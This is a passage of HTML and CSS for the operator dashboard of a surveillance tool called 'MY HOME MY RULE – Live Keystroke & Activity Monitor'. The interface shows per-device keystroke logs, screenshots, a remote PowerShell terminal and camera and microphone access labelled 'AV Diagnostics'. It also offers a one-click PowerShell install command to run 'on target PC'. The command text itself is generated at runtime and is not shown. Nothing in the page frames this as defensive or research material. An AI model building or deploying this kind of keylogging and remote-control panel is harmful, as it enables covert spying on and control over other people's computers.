        .tab-content.active {
            display: block;
        }
        
        /* Action / Selection Bar */
        .action-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background-color: var(--bg-card);
            border: 1px solid var(--border);
            padding: 0.75rem 1.25rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
        }
        
        .select-all-container {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            font-size: 0.9rem;
            cursor: pointer;
            user-select: none;
        }
        
        .bulk-delete-btn {
            background-color: #ef4444;
            color: white;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            font-size: 0.875rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .bulk-delete-btn:hover:not(:disabled) {
            background-color: #dc2626;
        }
        
        .bulk-delete-btn:disabled {
            background-color: var(--border);
            color: var(--text-muted);
            cursor: not-allowed;
            opacity: 0.5;
        }
        
        /* Card Checkboxes */
        .checkbox-container {
            display: flex;
            align-items: center;
            margin-right: 0.5rem;
        }
        
        .card-checkbox {
            width: 16px;
            height: 16px;
            border-radius: 4px;
            border: 2px solid var(--border);
            accent-color: var(--accent);
            cursor: pointer;
        }
        
        /* Logs Styling */
        .logs-container {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
        
        .log-card {
            background-color: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 1.25rem;
            transition: transform 0.2s ease, border-color 0.2s ease;
        }
        
        .log-card:hover {
            border-color: var(--accent);
            transform: translateY(-2px);
        }
        
        .log-meta {
            display: flex;
            flex-wrap: wrap;
            gap: 0.75rem;
            align-items: center;
            margin-bottom: 0.75rem;
            font-size: 0.8rem;
        }
        
        .log-time {
            color: var(--text-muted);
            font-family: 'JetBrains Mono', monospace;
        }
        
        .log-window {
            background-color: rgba(99, 102, 241, 0.15);
            color: #a5b4fc;
            padding: 0.25rem 0.625rem;
            border-radius: 4px;
            font-weight: 500;
            border: 1px solid rgba(99, 102, 241, 0.3);
            max-width: 400px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .log-text {
            font-size: 1.05rem;
            font-weight: 500;
            line-height: 1.5;
            word-break: break-all;
        }
        
        .log-screenshot-link {
            display: inline-flex;
            align-items: center;
            gap: 0.375rem;
            font-size: 0.8rem;
            color: var(--accent);
            text-decoration: none;
            margin-top: 0.75rem;
            font-weight: 500;
            cursor: pointer;
        }
        
        .log-screenshot-link:hover {
            color: var(--accent-hover);
            text-decoration: underline;
        }
        
        .delete-btn {
            background-color: #ef4444;
            color: white;
            border: none;
            padding: 0.35rem 0.75rem;
            border-radius: 4px;
            font-size: 0.75rem;
            font-weight: 600;
            cursor: pointer;
            margin-top: 0.75rem;
            transition: background-color 0.2s;
            width: 100%;
            display: block;
            text-align: center;
        }
        
        .delete-btn:hover {
            background-color: #dc2626;
        }
        
        .delete-icon-btn {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 0.8rem;
            cursor: pointer;
            margin-left: auto;
            transition: color 0.2s;
            padding: 0.25rem 0.5rem;
            border-radius: 4px;
        }
        
        .delete-icon-btn:hover {
            color: #ef4444;
            background-color: rgba(239, 68, 68, 0.1);
        }
        
        /* Screenshots Grid */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 1.5rem;
        }
        
        .screenshot-card {
            background-color: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            overflow: hidden;
            transition: transform 0.2s ease, border-color 0.2s ease;
            cursor: pointer;
            position: relative;
        }
        
        .screenshot-card:hover {
            border-color: var(--accent);
            transform: translateY(-4px);
        }
        
        .screenshot-checkbox-wrapper {
            position: absolute;
            top: 10px;
            left: 10px;
            z-index: 10;
            background-color: rgba(15, 23, 42, 0.8);
            padding: 4px;
            border-radius: 4px;
            border: 1px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .img-container {
            width: 100%;
            height: 160px;
            background-color: #0b0f19;
            overflow: hidden;
            position: relative;
            border-bottom: 1px solid var(--border);
        }
        
        .img-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: transform 0.3s ease;
        }
        
        .screenshot-card:hover .img-container img {
            transform: scale(1.05);
        }
        
        .screenshot-info {
            padding: 1rem;
        }
        
        .screenshot-window {
            font-size: 0.85rem;
            font-weight: 600;
            color: var(--text-main);
            margin-bottom: 0.5rem;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            padding-left: 0.25rem;
        }
        
        .screenshot-time {
            font-size: 0.75rem;
            color: var(--text-muted);
            font-family: 'JetBrains Mono', monospace;
            padding-left: 0.25rem;
        }
        
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(15, 23, 42, 0.95);
            align-items: center;
            justify-content: center;
            padding: 2rem;
        }
        
        .modal-content {
            max-width: 90%;
            max-height: 85%;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            border-radius: 8px;
            border: 1px solid var(--border);
            object-fit: contain;
        }
        
        .modal-close {
            position: absolute;
            top: 1.5rem;
            right: 2rem;
            color: var(--text-main);
            font-size: 2.5rem;
            cursor: pointer;
            user-select: none;
            transition: color 0.2s;
        }
        
        .modal-close:hover {
            color: var(--accent);
        }
        
        .modal-delete-btn {
            background-color: #ef4444;
            color: white;
            border: none;
            padding: 0.625rem 1.25rem;
            border-radius: 6px;
            font-size: 0.9rem;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 0.5rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
        }
        
        .modal-delete-btn:hover {
            background-color: #dc2626;
        }
        
            color: var(--text-muted);
            background-color: var(--bg-card);
            border-radius: 8px;
            border: 1px dashed var(--border);
        }

        /* Device Grid and Navigation */
        .view-screen {
            animation: fadeIn 0.2s ease-in-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(4px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .device-card {
            background-color: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 1.5rem;
            cursor: pointer;
            transition: all 0.2s ease-in-out;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            min-height: 150px;
            position: relative;
            overflow: hidden;
        }
        
        .device-card:hover {
            transform: translateY(-4px);
            border-color: var(--accent);
            background-color: var(--bg-hover);
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.3), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
        }
        
        .device-card-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 1rem;
        }
        
        .device-card-name {
            font-size: 1.1rem;
            font-weight: 600;
            color: var(--text-main);
        }
        
        .device-card-id {
            font-size: 0.75rem;
            font-family: 'JetBrains Mono', monospace;
            color: var(--text-muted);
            margin-top: 0.25rem;
        }
        
        .status-badge {
            display: flex;
            align-items: center;
            gap: 0.35rem;
            font-size: 0.75rem;
            font-weight: 600;
            padding: 0.25rem 0.6rem;
            border-radius: 9999px;
            border: 1px solid transparent;
        }
        
        .status-badge.online {
            background-color: rgba(16, 185, 129, 0.1);
            color: var(--live);
            border-color: rgba(16, 185, 129, 0.2);
        }
        
        .status-badge.offline {
            background-color: rgba(148, 163, 184, 0.1);
            color: var(--text-muted);
            border-color: rgba(148, 163, 184, 0.2);
        }
        
        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            display: inline-block;
        }
        
        .status-badge.online .status-dot {
            background-color: var(--live);
            box-shadow: 0 0 8px var(--live);
            animation: pulse-dot 2s infinite;
        }
        
        .status-badge.offline .status-dot {
            background-color: var(--text-muted);
        }
        
        @keyframes pulse-dot {
            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
            70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }
        
        /* Modal Lightbox Visual Arrows */
        .modal-arrow {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            background-color: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.15);
            color: #ffffff;
            width: 54px;
            height: 54px;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.25s ease;
            z-index: 2100;
            outline: none;
            backdrop-filter: blur(4px);
        }
        
        .modal-arrow:hover {
            background-color: rgba(15, 23, 42, 0.95);
            border-color: #ffffff;
            transform: translateY(-50%) scale(1.08);
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
        }
        
        .modal-arrow:active {
            transform: translateY(-50%) scale(0.95);
        }
        
        .modal-arrow-left {
            left: 2rem;
        }
        
        .modal-arrow-right {
            right: 2rem;
        }
        
        /* Adjust for smaller screens */
        .enroll-grid {
            display: grid;
            grid-template-columns: auto 1fr;
            gap: 1.5rem;
            align-items: center;
        }
        @media (max-width: 640px) {
            .enroll-grid {
                grid-template-columns: 1fr !important;
            }
            .modal-arrow {
                width: 44px;
                height: 44px;
            }
            .modal-arrow-left {
                left: 0.75rem;
            }
            .modal-arrow-right {
                right: 0.75rem;
            }
        }
    </style>
</head>
<body>
    <!-- Landing Page (Monitored Devices Grid) -->
    <div id="landing-page" class="container view-screen">
        <header style="margin-bottom: 2rem;">
            <div>
                <h1>MY HOME MY RULE</h1>
                <p style="color: var(--text-muted); font-size: 0.9rem; margin-top: 0.25rem;">Live Keystroke & Activity Monitor - Monitored Devices Overview</p>
            </div>
            <div style="display: flex; align-items: center; gap: 0.75rem;">
                <div class="live-status">
                    <span class="live-dot" style="background-color: var(--live); box-shadow: 0 0 8px var(--live); animation: pulse-dot 2s infinite;"></span>
                    ACTIVE MONITOR
                </div>
                <a href="/logout" style="color: var(--text-muted); font-size: 0.8rem; text-decoration: none; padding: 0.35rem 0.75rem; border: 1px solid var(--border); border-radius: 6px; display: flex; align-items: center; gap: 0.35rem; transition: all 0.2s;" title="Sign out of dashboard">
                    <svg style="width: 14px; height: 14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
                    Logout
                </a>
            </div>
        </header>

        <!-- Live Auto-Refreshing Enrollment Widget -->
        <div style="background: linear-gradient(135deg, rgba(30, 41, 59, 0.7) 0%, rgba(15, 23, 42, 0.9) 100%); border: 1px solid rgba(56, 189, 248, 0.3); border-radius: 12px; padding: 1.5rem; margin-bottom: 2rem; box-shadow: 0 8px 32px rgba(0,0,0,0.4); display: flex; flex-direction: column; gap: 1rem;">
            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 0.75rem; border-bottom: 1px solid rgba(255,255,255,0.08); padding-bottom: 0.85rem;">
                <div style="display: flex; align-items: center; gap: 0.6rem;">
                    <span class="live-dot" style="background:#38bdf8; width:10px; height:10px; box-shadow:0 0 10px #38bdf8;"></span>
                    <span style="font-size: 1rem; font-weight: 700; color: #f8fafc; letter-spacing: -0.2px;">Quick Device Registration</span>
                    <span style="background: rgba(56, 189, 248, 0.15); color: #38bdf8; font-size: 0.72rem; padding: 2px 8px; border-radius: 9999px; font-weight: 600; border: 1px solid rgba(56, 189, 248, 0.3);">AUTO-REFRESHING OTP</span>
                </div>
                <div style="display: flex; align-items: center; gap: 0.75rem;">
                    <span style="font-size: 0.82rem; color: var(--text-muted);">Refreshes in:</span>
                    <span id="banner-otp-timer" style="font-family: monospace; font-size: 0.95rem; font-weight: 700; color: #38bdf8; background: rgba(56, 189, 248, 0.1); padding: 2px 8px; border-radius: 4px; border: 1px solid rgba(56, 189, 248, 0.25);">01:00</span>
                    <button onclick="refreshBannerOtp()" style="background: rgba(255,255,255,0.06); border: 1px solid var(--border); color: #e2e8f0; font-size: 0.78rem; padding: 0.35rem 0.75rem; border-radius: 6px; cursor: pointer; display: flex; align-items: center; gap: 0.35rem; transition: all 0.2s;" title="Force generate new OTP now">
                        <svg style="width:12px;height:12px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 1121.21 4.79M9 9h9v9"></path></svg>
                        Refresh OTP
                    </button>
                </div>
            </div>

            <div class="enroll-grid">
                <!-- OTP Display Box -->
                <div style="background: #0b1120; border: 1px solid rgba(56, 189, 248, 0.3); border-radius: 10px; padding: 1rem 1.5rem; text-align: center; min-width: 170px;">
                    <div style="font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1.5px; color: #94a3b8; margin-bottom: 0.3rem; font-weight: 600;">Setup OTP</div>
                    <div id="banner-otp-display" style="font-family: 'Cascadia Code', Consolas, monospace; font-size: 2rem; font-weight: 800; letter-spacing: 6px; color: #38bdf8;">······</div>
                    <div style="font-size: 0.68rem; color: #64748b; margin-top: 0.25rem;">Live code (auto-updates)</div>
                </div>

                <!-- Command Box -->
                <div style="display: flex; flex-direction: column; gap: 0.45rem;">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <span style="font-size: 0.82rem; font-weight: 600; color: #e2e8f0;">PowerShell Command for Client Machine:</span>
                        <span style="font-size: 0.75rem; color: #94a3b8;">Run in PowerShell on target PC</span>
                    </div>
                    <div style="display: flex; gap: 0.5rem; align-items: center;">
                        <input type="text" id="banner-otp-cmd" readonly onclick="this.select()"
                            style="flex: 1; background: #0b1120; border: 1px solid #334155; padding: 0.65rem 0.85rem; border-radius: 8px; color: #38bdf8; font-family: 'Cascadia Code', Consolas, monospace; font-size: 0.82rem; outline: none;"
                            value="Generating command...">
                        <button onclick="copyBannerCmd()" id="banner-copy-btn" disabled
                            style="background: var(--accent); border: none; color: #fff; padding: 0.65rem 1.25rem; border-radius: 8px; font-size: 0.85rem; font-weight: 600; cursor: not-allowed; opacity: 0.5; white-space: nowrap; transition: all 0.2s; display: flex; align-items: center; gap: 0.4rem; box-shadow: 0 4px 12px rgba(37,99,235,0.4);">
                            <svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                            Copy Command
                        </button>
                    </div>
                    <div id="banner-status-text" style="font-size: 0.76rem; color: #94a3b8; display: flex; align-items: center; gap: 0.4rem;">
                        <span>💡 Paste this command into PowerShell on any client machine to install & connect it.</span>
                    </div>
                </div>
            </div>
        </div>
        
        <h2 style="font-size: 1.2rem; font-weight: 600; margin-bottom: 1.5rem; color: var(--text-muted); display: flex; align-items: center; justify-content: space-between;">
            <div style="display: flex; align-items: center; gap: 0.5rem;">
                Monitored Devices
                <span id="device-count-badge" style="background-color: var(--bg-card); color: var(--text-main); font-size: 0.8rem; padding: 0.15rem 0.5rem; border-radius: 9999px; border: 1px solid var(--border);">0</span>
            </div>
            <button onclick="refreshBannerOtp()" style="background: var(--accent); border: none; color: #fff; padding: 0.45rem 1rem; border-radius: 6px; font-size: 0.85rem; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 0.4rem; box-shadow: 0 2px 8px rgba(37,99,235,0.3);">
                <svg style="width: 16px; height: 16px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"></path></svg>
                New OTP
            </button>
        </h2>
        
        <div id="devices-grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 1.5rem;">
            <div class="no-data" style="grid-column: 1 / -1;">No monitored devices enrolled yet. Run the registration command above to connect a PC.</div>
        </div>
    </div>

    <!-- Detail Page (Keystrokes & Screenshots) -->
    <div id="detail-page" class="container view-screen" style="display: none;">
        <header>
            <div style="display: flex; align-items: center; gap: 1rem;">
                <button onclick="goBackToDevices()" style="background-color: var(--bg-card); border: 1px solid var(--border); color: var(--text-main); font-size: 0.85rem; font-weight: 600; padding: 0.5rem 1rem; border-radius: 6px; cursor: pointer; transition: all 0.2s; display: flex; align-items: center; gap: 0.5rem; outline: none;">
                    <svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
                    Back
                </button>
                <div>
                    <h1 id="detail-device-title" style="font-size: 1.5rem;">Device Details</h1>
                    <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 0.1rem;" id="detail-device-subtitle">Keystroke logs & screenshots</p>
                </div>
            </div>
            <div style="display: flex; align-items: center; gap: 1rem; flex-wrap: wrap;">
                <div class="date-selector-wrapper" style="display: none;">
                    <select id="device-select" class="date-select" onchange="changeDevice(this.value)"></select>
                </div>
                <div class="date-selector-wrapper">
                    <button onclick="openTerminalModal()" style="background: linear-gradient(135deg, #1e293b, #0f172a); border: 1px solid #38bdf8; color: #38bdf8; padding: 0.4rem 0.85rem; border-radius: 6px; cursor: pointer; display: flex; align-items: center; gap: 0.4rem; font-size: 0.85rem; font-weight: 700; box-shadow: 0 0 12px rgba(56, 189, 248, 0.25); transition: all 0.2s;" title="Open Remote PowerShell Terminal">
                        <svg style="width:15px;height:15px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                        PowerShell Terminal
                    </button>
                    <button onclick="openAvModal()" style="background: linear-gradient(135deg, #1e293b, #0f172a); border: 1px solid #10b981; color: #10b981; padding: 0.4rem 0.85rem; border-radius: 6px; cursor: pointer; display: flex; align-items: center; gap: 0.4rem; font-size: 0.85rem; font-weight: 700; box-shadow: 0 0 12px rgba(16, 185, 129, 0.25); transition: all 0.2s;" title="Open Camera & Microphone Diagnostics Session">
                        <svg style="width:15px;height:15px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                        AV Diagnostics
                    </button>
                    <button onclick="openSettingsModal()" style="background-color: var(--bg-card); border: 1px solid var(--border); color: var(--text-main); padding: 0.4rem 0.8rem; border-radius: 6px; cursor: pointer; display: flex; align-items: center; gap: 0.35rem; font-size: 0.85rem; font-weight: 600; transition: all 0.2s;" title="Device Settings">
                        <svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                        Settings
                    </button>
                    <button onclick="openOtpModal()" style="background-color: var(--accent); border: none; color: #fff; padding: 0.4rem 0.8rem; border-radius: 6px; cursor: pointer; display: flex; align-items: center; gap: 0.35rem; font-size: 0.85rem; font-weight: 600; transition: all 0.2s;" title="Add Device (OTP)">
                        <svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"></path></svg>
                        Add Device
                    </button>
                    <button id="purge-btn" onclick="purgeSelectedDateRange()" style="background: none; border: none; color: #ef4444; font-size: 0.85rem; cursor: pointer; font-weight: 600; padding: 0.25rem 0.5rem; margin-left: 0.25rem;" title="Purge all logs & screenshots for selected timeframe">Purge Today</button>
                </div>
                <div class="date-selector-wrapper">
                    <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">Timeframe:</span>
                    <select id="date-preset-select" class="date-select" onchange="changeDatePreset(this.value)">
                        <option value="today">Today</option>
                        <option value="range">Date Range</option>
                        <option value="all">All Time</option>
                    </select>
                </div>
                <div class="date-selector-wrapper" id="start-date-wrapper" style="display: none;">
                    <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">Start:</span>
                    <input type="date" id="start-date-input" class="date-select" onchange="changeDateRange()" style="border: none; color-scheme: dark; font-weight: 600;">
                </div>
                <div class="date-selector-wrapper" id="end-date-wrapper" style="display: none;">
                    <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">End:</span>
                    <input type="date" id="end-date-input" class="date-select" onchange="changeDateRange()" style="border: none; color-scheme: dark; font-weight: 600;">
                </div>
                <div class="date-selector-wrapper">
                    <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">Sort:</span>
                    <select id="sort-select" class="date-select" onchange="changeSort(this.value)">
                        <option value="asc">Oldest First (Asc)</option>
                        <option value="desc">Newest First (Desc)</option>
                    </select>
                </div>
                <button onclick="manualRefresh()" style="background-color: var(--bg-card); border: 1px solid var(--border); color: var(--text-main); padding: 0.4rem 0.8rem; border-radius: 6px; cursor: pointer; display: flex; align-items: center; gap: 0.35rem; font-size: 0.85rem; font-weight: 600; transition: all 0.2s;" title="Refresh Data">
                    <svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 1121.21 4.79M9 9h9v9"></path></svg>
                    Refresh
                </button>
                <a href="/logout" style="background-color: var(--bg-card); border: 1px solid var(--border); color: var(--text-muted); padding: 0.4rem 0.8rem; border-radius: 6px; text-decoration: none; display: flex; align-items: center; gap: 0.35rem; font-size: 0.85rem; font-weight: 600; transition: all 0.2s;" title="Sign out of dashboard">
                    <svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
                    Logout
                </a>
                <div class="live-status">
                    <span class="live-dot" id="detail-live-dot"></span>
                    <span id="detail-live-status-text">LIVE CONNECTED</span>
                </div>
            </div>
        </header>
        
        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('logs-tab', this)">Keystroke Logs</button>
            <button class="tab-btn" onclick="switchTab('screenshots-tab', this)">Screenshots</button>
        </div>
        
        <div class="filter-bar" style="display: flex; align-items: center; gap: 1rem; margin-bottom: 1.5rem; background-color: var(--bg-card); border: 1px solid var(--border); padding: 0.75rem 1rem; border-radius: 8px; flex-wrap: wrap;">
            <div style="flex: 1; min-width: 250px; display: flex; align-items: center; gap: 0.5rem; background-color: var(--bg-main); border: 1px solid var(--border); padding: 0.4rem 0.75rem; border-radius: 6px;">
                <svg style="width:16px;height:16px;color:var(--text-muted);" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                <input type="text" id="search-input" oninput="applyFilters()" placeholder="Search logs, app window titles..." style="background:none; border:none; outline:none; color:var(--text-main); width:100%; font-size:0.9rem;">
            </div>
            <label style="display: flex; align-items: center; gap: 0.5rem; font-size: 0.9rem; color: var(--text-muted); cursor: pointer; user-select: none;">
                <input type="checkbox" id="group-checkbox" onchange="applyFilters()" style="cursor: pointer; accent-color: var(--accent); width:16px; height:16px;">
                Group by App
            </label>
        </div>
        
        <div id="logs-tab" class="tab-content active">
            <div class="action-bar" id="logs-action-bar" style="display: none;">
                <label class="select-all-container">
                    <input type="checkbox" class="card-checkbox" id="select-all-logs" onchange="toggleSelectAllLogs(this)">
                    Select All
                </label>
                <button class="bulk-delete-btn" id="bulk-delete-logs-btn" disabled onclick="bulkDeleteLogs()">
                    Delete Selected (0)
                </button>
            </div>
            <div id="logs-list" class="logs-container">
                <div class="no-data">Waiting for activity logs...</div>
            </div>
        </div>
        
        <div id="screenshots-tab" class="tab-content">
            <div class="action-bar" id="screenshots-action-bar" style="display: none;">
                <label class="select-all-container">
                    <input type="checkbox" class="card-checkbox" id="select-all-screenshots" onchange="toggleSelectAllScreenshots(this)">
                    Select All
                </label>
                <button class="bulk-delete-btn" id="bulk-delete-screenshots-btn" disabled onclick="bulkDeleteScreenshots()">
                    Delete Selected (0)
                </button>
            </div>
            <div id="screenshots-grid" class="grid">
                <div class="no-data" style="grid-column: 1 / -1;">Waiting for screenshots...</div>
            </div>
        </div>
    </div>
    
    <div id="imgModal" class="modal" onclick="closeModal()">
        <span class="modal-close" onclick="event.stopPropagation(); closeModal();">&times;</span>
        
        <!-- Left Arrow Button -->
        <button class="modal-arrow modal-arrow-left" onclick="event.stopPropagation(); navigateModal(-1);" title="Previous Screenshot">
            <svg style="width:24px;height:24px;" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"></path></svg>
        </button>
        
        <!-- Right Arrow Button -->
        <button class="modal-arrow modal-arrow-right" onclick="event.stopPropagation(); navigateModal(1);" title="Next Screenshot">
            <svg style="width:24px;height:24px;" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 5l7 7-7 7"></path></svg>
        </button>

        <div style="position: relative; display: flex; flex-direction: column; align-items: center; gap: 1rem; max-width: 80%; max-height: 90vh;" onclick="event.stopPropagation();">
            <img class="modal-content" id="modalImg" style="max-width: 100%; max-height: 75vh;">
            <button id="modal-delete-btn" class="modal-delete-btn" onclick="deleteModalScreenshot()">Delete Screenshot</button>
        </div>
    </div>

    <!-- OTP Setup Modal -->
    <div id="otp-modal" class="modal-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:2200; align-items:center; justify-content:center; opacity:0; pointer-events:none; transition: opacity 0.2s ease;">
        <div style="background:var(--bg-card); border:1px solid var(--border); border-radius:12px; width:520px; max-width:92%; padding:1.75rem; box-shadow:0 12px 40px rgba(0,0,0,0.7);">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1.25rem; border-bottom:1px solid var(--border); padding-bottom:0.75rem;">
                <div style="display:flex; align-items:center; gap:0.6rem;">
                    <svg style="width:20px;height:20px;color:var(--accent);" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                    <h3 style="margin:0; font-size:1.15rem; color:var(--text-main);">Add New Device (OTP Setup)</h3>
                </div>
                <button onclick="closeOtpModal()" style="background:none; border:none; color:var(--text-muted); cursor:pointer; font-size:1.25rem;">&times;</button>
            </div>
            
            <p style="color:var(--text-muted); font-size:0.85rem; margin-top:0; margin-bottom:1.25rem;">
                This one-time installation OTP expires in <b id="otp-timer" style="color:#f59e0b;">10:00</b>. It can only be used once to pair a new client machine.
            </p>

            <div style="text-align:center; padding:1.25rem; background:var(--bg-main); border:1px solid var(--border); border-radius:8px; margin-bottom:1.25rem;">
                <div style="font-size:0.75rem; text-transform:uppercase; letter-spacing:1px; color:var(--text-muted); margin-bottom:0.4rem;">Setup OTP Code</div>
                <div id="otp-display" style="font-family:'Cascadia Code',Consolas,monospace; font-size:2.4rem; font-weight:700; letter-spacing:8px; color:#38bdf8;">------</div>
            </div>

            <div style="margin-bottom:1.25rem;">
                <div style="font-size:0.85rem; font-weight:600; color:var(--text-main); margin-bottom:0.4rem;">Option 1: One-Click PowerShell Command (Recommended)</div>
                <div style="display:flex; gap:0.5rem; align-items:center;">
                    <input type="text" id="otp-cmd-input" readonly style="flex:1; background:var(--bg-main); border:1px solid var(--border); padding:0.55rem; border-radius:6px; color:#e6edf3; font-family:monospace; font-size:0.78rem;" onclick="this.select()">
                    <button onclick="copyOtpCommand()" id="otp-copy-btn" style="background:var(--accent); border:none; color:#fff; padding:0.55rem 1rem; border-radius:6px; font-size:0.82rem; font-weight:600; cursor:pointer; white-space:nowrap;">Copy</button>
                </div>
            </div>

